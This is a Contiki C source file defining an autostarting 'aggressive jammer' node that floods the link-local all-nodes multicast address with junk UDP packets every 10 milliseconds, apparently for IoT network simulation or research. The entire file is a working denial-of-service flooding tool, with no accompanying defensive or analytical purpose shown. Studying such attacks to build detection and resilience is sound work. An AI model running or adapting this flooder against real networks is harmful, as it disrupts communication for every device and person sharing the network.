#include "contiki.h"
#include "net/ip/uip.h"
#include "net/ipv6/uip-ds6.h"
#include "net/ip/uip-udp-packet.h"
#include <string.h>
#include <stdio.h>

#define JAM_INTERVAL (CLOCK_SECOND / 100)  // 10 ms

PROCESS(jammer_process, "Aggressive UDP Jammer Process");
AUTOSTART_PROCESSES(&jammer_process);

static struct uip_udp_conn *jam_conn;

PROCESS_THREAD(jammer_process, ev, data)
{
  static struct etimer et;
  static char jam_payload[] = "###### JAM JAM JAM ######";

  PROCESS_BEGIN();

  printf("Aggressive jammer node started\n");

  jam_conn = udp_new(NULL, UIP_HTONS(1234), NULL);
  if (jam_conn == NULL) {
    printf("❌ Failed to create jammer UDP connection\n");
    PROCESS_EXIT();
  }

  etimer_set(&et, JAM_INTERVAL);

  while (1) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&et));
    etimer_reset(&et);

    uip_create_linklocal_allnodes_mcast(&jam_conn->ripaddr);
    uip_udp_packet_send(jam_conn, jam_payload, strlen(jam_payload));
    memset(&jam_conn->ripaddr, 0, sizeof(jam_conn->ripaddr)); // reset target

    printf("JAM SENT\n");
  }

  PROCESS_END();
}
